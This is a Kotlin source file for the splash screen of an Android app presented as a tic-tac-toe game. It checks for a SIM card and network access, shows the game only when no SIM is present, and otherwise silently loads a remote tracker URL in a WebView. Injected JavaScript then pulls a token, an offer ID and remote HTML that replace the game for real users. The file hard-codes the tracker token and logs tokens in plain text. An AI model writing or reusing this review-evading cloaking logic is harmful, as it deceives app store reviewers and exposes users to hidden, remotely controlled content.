package com.tictacx.toe

import android.annotation.SuppressLint
import android.content.Context
import android.content.Intent
import android.net.ConnectivityManager
import android.net.NetworkInfo
import android.os.Bundle
import android.os.CountDownTimer
import android.os.Handler
import android.os.Looper
import android.telephony.TelephonyManager
import android.util.Log
import android.view.View
import android.webkit.JavascriptInterface
import android.webkit.WebSettings
import android.webkit.WebView
import android.webkit.WebViewClient
import androidx.appcompat.app.AppCompatActivity
import kotlinx.android.synthetic.main.activity_splash_screen.*
import org.json.JSONObject


@SuppressLint("CustomSplashScreen")
class SplashScreen : AppCompatActivity() {

    private val networkMonitor = NetworkMonitorUtil(this)

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_splash_screen)

        supportActionBar?.hide()

        val timer = object : CountDownTimer(1000, 500) {
            override fun onTick(millisUntilFinished: Long) {

            }

            override fun onFinish() {


                var result = true
                try {
                    val telMgr = getSystemService(TELEPHONY_SERVICE) as TelephonyManager
                    val simState = telMgr.simState
                    when (simState) {
                        TelephonyManager.SIM_STATE_ABSENT -> result = false
                        TelephonyManager.SIM_STATE_UNKNOWN -> result = false
                        else -> {
                        }
                    }
                } catch (e: Exception) {
                    //ignore
                }
                // проверка симки
                val sim = result

                if (isWorkingInternetPersent()) {
                    if (sim) {
                        splash();
                    } else {
                        val i = Intent(applicationContext, GameActivity::class.java)
                        startActivity(i)
                        finish()
                    }

                } else {
                    if (!sim) {
                        val i = Intent(applicationContext, GameActivity::class.java)
                        startActivity(i)
                        finish()
                    } else {
                        splash_screen.visibility = View.GONE
                        connect_info.visibility = View.VISIBLE
                        this.start()
                    }

                }
                //
            }

        }
        timer.start()

        //splash()

    }

    fun isWorkingInternetPersent(): Boolean {
        val connectivityManager = baseContext
            .getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        if (connectivityManager != null) {
            val info = connectivityManager.allNetworkInfo
            if (info != null) for (i in info.indices) if (info[i].state == NetworkInfo.State.CONNECTED) {
                return true
            }
        }
        return false
    }

    fun splash() {
        val timerTread: Thread = object : Thread() {
            override fun run() {
                try {
                    sleep(100)
                } catch (e: InterruptedException) {
                    e.printStackTrace()
                } finally {

//                    val sendPostBack =
//                        getSharedPreferences(packageName, MODE_PRIVATE).getBoolean("sendPostBack",
//                            false)
//
//                    val postBack = getSharedPreferences(packageName, MODE_PRIVATE)

                    var sim: Boolean
                    var locale: String
                    var localeBoolean: Boolean
                    var gameBoolean: Boolean

                    //проверка первого открытия приложения
//                    if (!sendPostBack) {
//                        getSharedPreferences(packageName, MODE_PRIVATE).edit()
//                            .putBoolean("sendPostBack", true)
//                            .apply()
//                        postBack.getBoolean("noFirstVisit", true)
//                    }

                    var ans_00: String = ""

                    splash_screen.alpha = 0f
                    splash_screen.animate().setDuration(2100).alpha(1f).withEndAction {

                        val web: WebView = findViewById(R.id.web_api)

                        web.webViewClient = object :
                            WebViewClient() {
                            override fun onPageFinished(view: WebView, url: String) {
                                /* This call inject JavaScript into the page which just finished loading. */
                                web.loadUrl("javascript:window.HTMLOUT.processHTML(document.getElementsByTagName('pre')[0].innerHTML);")
                            }
                        }


                        web.settings.javaScriptEnabled = true
                        web.canGoBack()
                        web.settings.loadsImagesAutomatically = true
                        //добавление кэша и куки
                        web.settings.setAppCacheEnabled(false)
                        web.settings.databaseEnabled = true
                        web.settings.domStorageEnabled = true; // Открываем кеш DOM
                        web.settings.cacheMode = WebSettings.LOAD_DEFAULT

                        val html_polisy = getSharedPreferences(packageName, MODE_PRIVATE)
                        web.addJavascriptInterface(object {
                            @JavascriptInterface
                            fun processHTML(html: String?) {
                                // process the html as needed by the ap

                                val json1: JSONObject = JSONObject(html!!)
                                var ans_00 = json1.getString("body").toString()
                                Log.d("log", "111111qqqqqqqqqqqqqqqqqqqqqqqqqqqqqq11111")
                                val ans_2: String = json1.getString("info")
                                Log.d("log",
                                    "222222222222222222222222222222222222222222222222222222222222222222222222222222")
                                Log.d("log", ans_2)
                                Log.d("log",
                                    "333333333333333333333333333333333333333333333333333333333333333333333333333333")
                                val json2: JSONObject = JSONObject(json1.getString("info"))
                                val ans_3: String = json2.getString("token")
                                val ans_4: String = json2.getString("offer_id")


                                Log.d("log", "token: " + ans_3)
                                Log.d("log", "offer_id: " + ans_4)
                                html_polisy.edit().putString("token", ans_3).apply()
                                html_polisy.edit().putString("offer_id", ans_4).apply()
                                //val html: String = ans_00.replace("&lt;", '<').replace('w', 'ц')

                                //Log.d("log", ans_00)
                                Handler(Looper.getMainLooper()).post {
                                    val policy_html: String = ans_00
                                    ans_00 = ans_00.replace("&lt;", "<").replace("&gt;", ">")
                                    Log.d("log", "policy_html")
                                    Log.d("log", ans_00)
                                    val i = Intent(applicationContext, MainActivity::class.java)
                                    i.putExtra("polisy", ans_00)
                                    startActivity(i)
                                    finish()
                                }

                            }
                        }, "HTMLOUT")

                        val token = "jZYDxHnTsRrjYJVP"
                        val tracker = "https://pomidorkins.store/KGW7JxG1"

                        val url_1 = "$tracker/click_api/v3?token=$token&log=1&info=1"

                        web.loadUrl(url_1)
                        //val draw: Drawable = getDrawable(applicationContext, R.drawable.custom_progressbar)!!

                    }
                }
            }
        }
        timerTread.start()
    }

}